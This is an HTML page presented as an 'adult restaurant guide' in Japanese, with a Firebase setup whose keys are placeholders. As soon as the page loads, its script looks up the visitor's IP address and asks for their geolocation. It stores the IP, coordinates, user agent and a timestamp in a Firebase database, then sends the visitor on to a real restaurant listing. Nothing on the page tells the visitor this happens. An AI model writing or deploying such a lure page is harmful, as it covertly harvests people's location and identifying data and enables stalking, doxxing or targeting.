<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>大人のレストランガイド</title>
    <style>
        body {
            background-color: black;
            color: white;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'MS Mincho', 'Yu Mincho', serif; /* 明朝体 */
        }
        h1 {
            font-size: 2em;
            text-align: center;
        }
    </style>
    <!-- Firebase SDKの追加 -->
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>
</head>
<body>
    <h1>大人のレストランガイド</h1>
    <script>
        // Firebaseの設定（Firebaseコンソールからコピーしたものを貼り付け）
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
            databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_PROJECT_ID.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        // Firebaseの初期化
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // IPアドレスを取得
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('IP取得エラー:', error);
                return '不明';
            }
        }

        // 位置情報とIPをFirebaseに送信
        async function recordData() {
            const ip = await getIP();
            const userAgent = navigator.userAgent;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const data = {
                            ip: ip,
                            latitude: latitude,
                            longitude: longitude,
                            userAgent: userAgent,
                            timestamp: firebase.database.ServerValue.TIMESTAMP
                        };
                        await sendToFirebase(data);
                        window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
                    },
                    async (error) => {
                        console.error('位置情報エラー:', error.message);
                        const data = {
                            ip: ip,
                            latitude: '拒否',
                            longitude: '拒否',
                            userAgent: userAgent,
                            timestamp: firebase.database.ServerValue.TIMESTAMP
                        };
                        await sendToFirebase(data);
                        alert('位置情報が取得できませんでした');
                    },
                    {
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                const data = {
                    ip: ip,
                    latitude: '非対応',
                    longitude: '非対応',
                    userAgent: userAgent,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                };
                await sendToFirebase(data);
                window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
            }
        }

        // Firebaseにデータを送信
        async function sendToFirebase(data) {
            try {
                const newRef = database.ref('userData').push();
                await newRef.set(data);
                console.log('データ送信成功');
            } catch (error) {
                console.error('送信エラー:', error);
            }
        }

        // ページ読み込み時に実行
        recordData();
    </script>
</body>
</html>
